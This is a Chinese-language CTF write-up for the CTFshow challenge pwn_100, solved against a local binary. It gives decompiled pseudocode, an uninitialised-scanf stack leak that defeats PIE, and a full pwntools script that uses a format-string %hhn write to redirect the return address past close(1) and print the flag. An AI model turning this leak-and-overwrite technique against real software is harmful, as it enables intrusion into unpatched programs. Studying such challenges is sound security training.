# CTFshow-pwn_100
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（任意写）
## 解题思路
> 栈上数据 leak + 指定地址任意写

保护全开    
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_100
[*] '/home/mrw/CTFshow/pwn_100'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

分析程序用得到的伪代码如下  
```c
unsigned __int64 initial()
{
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  fd = open("/dev/urandom", 0);
  if ( read(fd, secret, 0x40uLL) < 0 )
  {
    puts("read error!");
    exit(1);
  }
  close(fd);
  return __readfsqword(0x28u) ^ v2;
}
unsigned __int64 whattime()
{
  __int64 v1; // [rsp+0h] [rbp-20h] BYREF
  __int64 v2; // [rsp+8h] [rbp-18h] BYREF
  __int64 v3; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("Hello my bro.");
  printf("What time is it :");
  _isoc99_scanf("%ld", &v1);
  _isoc99_scanf("%ld", &v2);
  _isoc99_scanf("%ld", &v3);
  printf("Ok! time is %ld:%ld:%ld\n", v1, v2, v3);
  return __readfsqword(0x28u) ^ v4;
}
unsigned __int64 menu()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("1. leak");
  puts("2. fmt_attack");
  puts("3. get_flag");
  puts("4. exit");
  printf(">>");
  return __readfsqword(0x28u) ^ v1;
}
unsigned __int64 __fastcall leak(int *a1)
{
  void *buf; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( *a1 > 0 )
  {
    puts("No way!");
    exit(1);
  }
  *a1 = 1;
  read_n(&buf, 8LL);
  write(1, buf, 1uLL);
  return __readfsqword(0x28u) ^ v3;
}
unsigned __int64 __fastcall fmt_attack(int *a1)
{
  char format[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(format, 0, 0x30uLL);
  if ( *a1 > 0 )
  {
    puts("No way!");
    exit(1);
  }
  *a1 = 1;
  read_n(format, 40LL);
  printf(format);
  return __readfsqword(0x28u) ^ v3;
}
void __noreturn get_flag()
{
  int fd; // [rsp+Ch] [rbp-64h]
  char s2[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v2; // [rsp+68h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(s2, 0, 0x50uLL);
  puts("Flag is here ! Come on !!");
  read_n(s2, 64LL);
  if ( !strncmp(secret, s2, 0x40uLL) )
  {
    close(1);
    fd = open("/flag", 0);
    read(fd, s2, 0x50uLL);
    printf(s2);
    exit(0);
  }
  puts("No way!");
  exit(1);
}
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-14h] BYREF
  int v4; // [rsp+10h] [rbp-10h] BYREF
  unsigned int v5; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  initial(argc, argv, envp);
  whattime();
  v3 = 0;
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        v5 = get_int();
        if ( v5 != 2 )
          break;
        fmt_attack(&v3);
      }
      if ( v5 > 2 )
        break;
      if ( v5 == 1 )
        leak(&v4);
    }
    if ( v5 == 3 )
      get_flag();
    if ( v5 == 4 )
    {
      puts("Bye!");
      exit(0);
    }
  }
}
```
- 程序有 ELF 保护但提供的 leak 功能仅能泄露一个字节，故可以在程序考试使用 scanf 要求输入整数时输入英文字母，由于不匹配 scanf 不会修改栈上的局部变量从而导致数据泄露，恰好可以泄露一个 stack 地址和一个 elf 文件代码段地址，据此可以算出程序加载基址从而绕过 PIE  
- 分析完代码的第一思路是利用 fmt泄露 secret 并利用 get_flag 功能输入正确的密码来获取 flag，尽管 secret 中可能混有空字符导致输出截断，但概率仍在可接受范围。然而由于密码正确时会先执行 close(1) 造成输出不可见，从而导致无法利用。~~谁懂写完脚本才看见 close(1) 的救赎感~~  
- 因此应当通过之前泄露的 stack 地址计算 fmt_attack 函数返回地址存储位置的地址，将其接触到密码正确时 close(1) 语句之后才能得到 flag  
- 格式化字符串利用时，输入内容起始处恰好位于第8个参数，而泄露的 stack 地址恰为 ret_addr - 8，多次调试发现由于内存页加载机制只需修改 retn_addr 的低两个字节为 0x56 和 0x0f 即可  

**exp如下**
```python
from pwn import *
p = process('./pwn_100')
gdb.attach(p)

# leak
p.sendlineafter(b'What time is it :', b'a b c')
p.recvuntil(b'time is ')
stack_addr = int(p.recvuntil(b':')[:-1])
elf_base = int(p.recvuntil(b':')[:-1]) - 0xbd5
print(f'stack_addr is {stack_addr:x}, elf_base is {elf_base:x}')
p.recvuntil(b'>>')

# fmt write and get flag
retn_addr = stack_addr + 0x8
target_addr = elf_base + 0xf56
p.sendafter(b'>>', b'2' + b'\x00' * 14) # 由于下一条输入无输入提示，需要将 get_int() 中 read(0, ..., 15) 填满，否则会影响接下来的输入
payload = b'%15c%11$hhn%71c%12$hhn__' + p64(retn_addr+1) + p64(retn_addr) # fmtstr_payload 构造的 fmt 过长
p.send(payload)
p.interactive()
```
## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_100.py
[+] Starting local process './pwn_100': pid 31169
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_100', '31169']
[+] Waiting for debugger: Done
stack_addr is 7fff556199a0, elf_base is 58c4bbc00000
[*] Switching to interactive mode
[*] Process './pwn_100' stopped with exit code 0 (pid 31169)
              `                                                                      (__\xa9\x99aU\xff\x7ffake{hajimionanbeiluduo}
[*] Got EOF while reading in interactive
```
